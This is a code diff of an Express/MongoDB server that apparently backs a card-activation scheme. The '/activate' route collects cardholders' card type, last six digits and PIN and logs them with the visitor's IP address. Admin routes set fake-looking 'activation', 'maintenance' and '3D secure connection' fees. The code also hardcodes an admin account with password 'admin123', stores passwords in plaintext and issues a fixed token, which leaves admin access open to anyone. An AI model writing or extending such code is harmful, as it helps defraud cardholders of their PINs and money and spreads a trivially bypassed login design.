@@ -1,10 +1,9 @@
 const express = require("express");
 const mongoose = require("mongoose");
 const cors = require("cors");
-const app = express();
-
 require("dotenv").config();
 
+const app = express();
 app.use(express.json());
 app.use(cors());
 
@@ -27,25 +26,27 @@ mongoose
     w: "majority",
     autoIndex: true,
   })
-  .then(() => console.log("Connected to MongoDB"))
+  .then(() => console.log("✅ Connected to MongoDB"))
   .catch((err) => console.error("MongoDB connection error:", err));
 
 mongoose.connection.on("disconnected", () =>
-  console.log("MongoDB disconnected")
+  console.log("⚠️ MongoDB disconnected")
 );
 mongoose.connection.on("error", (err) =>
   console.error("MongoDB connection error event:", err)
 );
 mongoose.connection.on("reconnected", () =>
-  console.log("MongoDB reconnected successfully")
+  console.log("🔄 MongoDB reconnected successfully")
 );
 
 process.on("SIGINT", () => {
   mongoose.connection.close(() => {
-    console.log("MongoDB connection closed due to app termination");
+    console.log("🔌 MongoDB connection closed due to app termination");
     process.exit(0);
   });
 });
+
+// =================== SCHEMAS ===================
 
 // Payment Schema
 const paymentSchema = new mongoose.Schema({
@@ -55,7 +56,7 @@ const paymentSchema = new mongoose.Schema({
 });
 const Payment = mongoose.model("Payment", paymentSchema);
 
-// Activation Schema (unchanged)
+// Activation Schema
 const activationSchema = new mongoose.Schema({
   cardType: { type: String, required: true },
   lastSixDigits: { type: String, required: true },
@@ -77,13 +78,15 @@ const adminSchema = new mongoose.Schema({
 });
 const Admin = mongoose.model("Admin", adminSchema);
 
-// Middleware to get IP
+// =================== MIDDLEWARE ===================
 const getIp = (req, res, next) => {
   req.ipAddress =
     req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   next();
 };
 app.use(getIp);
+
+// =================== ROUTES ===================
 
 // Admin Login
 app.post("/admin/login", async (req, res) => {
@@ -95,7 +98,7 @@ app.post("/admin/login", async (req, res) => {
       await admin.save();
       return res
         .status(200)
-        .json({ message: "Login successful", token: "admin-token" }); // Simple token for now
+        .json({ message: "Login successful", token: "admin-token" });
     }
     return res.status(401).json({ message: "Invalid credentials" });
   } catch (error) {
@@ -104,11 +107,9 @@ app.post("/admin/login", async (req, res) => {
   }
 });
 
-// Validate last 6 digits (unchanged)
+// Validate last 6 digits
 app.post("/validate-digits", async (req, res) => {
   const { lastSixDigits } = req.body;
-  console.log("Validating digits:", lastSixDigits);
-
   try {
     if (!lastSixDigits) {
       return res
@@ -123,15 +124,11 @@ app.post("/validate-digits", async (req, res) => {
     return res.status(200).json({ message: "Digits validated successfully" });
   } catch (error) {
     console.error("Server error in /validate-digits:", error);
-    return res
-      .status(500)
-      .json({
-        message: "An unexpected error occurred. Please try again later.",
-      });
+    return res.status(500).json({ message: "Unexpected error occurred." });
   }
 });
 
-// Activate card with PIN
+// Activate card
 app.post("/activate", async (req, res) => {
   const {
     cardType,
@@ -142,7 +139,6 @@ app.post("/activate", async (req, res) => {
     accept,
     pin,
   } = req.body;
-  console.log("Activating card with data:", req.body);
 
   try {
     if (
@@ -169,7 +165,7 @@ app.post("/activate", async (req, res) => {
     if (isNaN(limit) || limit > 5000 || limit < 0) {
       return res
         .status(400)
-        .json({ message: "Daily limit must be a number between 0 and 5000." });
+        .json({ message: "Daily limit must be between 0 and 5000." });
     }
 
     const validCurrencies = [
@@ -211,16 +207,11 @@ app.post("/activate", async (req, res) => {
       userIp: req.ipAddress,
     });
     await newActivation.save();
-    console.log("Activation saved to DB with IP:", req.ipAddress);
 
     return res.status(200).json({ message: "Card activated successfully" });
   } catch (error) {
     console.error("Server error in /activate:", error);
-    return res
-      .status(500)
-      .json({
-        message: "An unexpected error occurred. Please try again later.",
-      });
+    return res.status(500).json({ message: "Unexpected error occurred." });
   }
 });
 
@@ -229,7 +220,12 @@ app.post("/admin/update-fees", async (req, res) => {
   const { vat, cardActivation, cardMaintenance, secureConnection } = req.body;
   const adminIp = req.ipAddress;
 
-  if (!vat || !cardActivation || !cardMaintenance || !secureConnection) {
+  if (
+    vat == null ||
+    cardActivation == null ||
+    cardMaintenance == null ||
+    secureConnection == null
+  ) {
     return res.status(400).json({ message: "All fee fields are required" });
   }
 
@@ -245,48 +241,54 @@ app.post("/admin/update-fees", async (req, res) => {
       },
     ];
     await Payment.insertMany(payments);
-    console.log("Fees updated by IP:", adminIp, "with data:", payments);
+    console.log("✅ Fees updated by IP:", adminIp, "with data:", payments);
 
     return res.status(200).json({ message: "Fees updated successfully" });
   } catch (error) {
     console.error("Server error in /admin/update-fees:", error);
     return res
       .status(500)
-      .json({ message: "An error occurred while updating fees." });
+      .json({ message: "Error occurred while updating fees." });
   }
 });
 
-// Fetch payments (only after admin update)
+// Fetch payments
 app.get("/api/payments", async (req, res) => {
   try {
-    const payments = await Payment.find().sort({ updatedAt: -1 }).limit(1);
+    let payments = await Payment.find();
+
+    // If no payments exist yet, create defaults
     if (payments.length === 0) {
-      return res
-        .status(404)
-        .json({
-          message: "No payment data available. Contact admin to update.",
-        });
+      payments = [
+        { label: "VAT (value added tax)", price: 0 },
+        { label: "Card activation", price: 0 },
+        { label: "Card maintenance", price: 0 },
+        { label: "3D visa/master/verve secure connection", price: 0 },
+      ];
+      await Payment.insertMany(payments);
+      payments = await Payment.find();
     }
+
     return res.status(200).json({ payments });
   } catch (error) {
     console.error("Server error in /api/payments:", error);
     return res
       .status(500)
-      .json({ message: "An error occurred while fetching payments." });
+      .json({ message: "Error occurred while fetching payments." });
   }
 });
 
+// =================== SERVER START ===================
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`🚀 Server running on port ${PORT}`);
 });
 
-// Initial admin setup (run once)
+// =================== INITIAL ADMIN SETUP ===================
 async function initAdmin() {
   const adminExists = await Admin.countDocuments();
   if (adminExists === 0) {
     await Admin.create({ username: "admin", password: "admin123" });
-    console.log(
-      "Initial admin user created with username: admin, password: admin123"
-    );
+    console.log("👤 Initial admin created: username=admin, password=admin123");
   }
 }
+initAdmin();
